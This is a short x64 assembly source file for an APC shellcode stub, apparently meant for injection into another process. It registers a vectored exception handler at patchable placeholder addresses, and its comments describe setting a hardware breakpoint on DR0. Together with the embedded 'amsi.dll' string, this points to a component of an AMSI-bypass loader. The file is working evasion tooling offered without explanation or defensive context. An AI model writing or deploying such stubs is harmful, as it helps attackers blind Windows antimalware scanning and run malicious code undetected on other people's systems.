[BITS 64]

; nasm -f bin apc.asm -o apc.bin ; xxd -i apc.bin
ApcStub:
    push rbp
    mov rbp, rsp
    sub rsp, 20h

    mov rax, 0x1337133713371337
    lea rcx, [rel debug_string]
    call rax                 ; OutputDebugStringA
    ; ============================

    ; 2. RtlAddVectoredExceptionHandler(1, pVehHandler)
    mov rcx, 1                  ; CALL_FIRST
    mov rdx, 0xDDDDDDDDDDDDDDDD ; Placeholder for pRemoteVeh
    mov rax, 0xEEEEEEEEEEEEEEEE ; Placeholder for pRtlAddVeh
    call rax

    ; 3. Trigger VEH to apply HWBP on DR0
    ; /!\ We let the TLS callback on main thread apply the int3
    ; int3

    add rsp, 20h
    pop rbp
    ret

align 8
AmsiStr:
    db 'amsi.dll', 0
debug_string:
    db "APC stub HIT (register VEH)", 0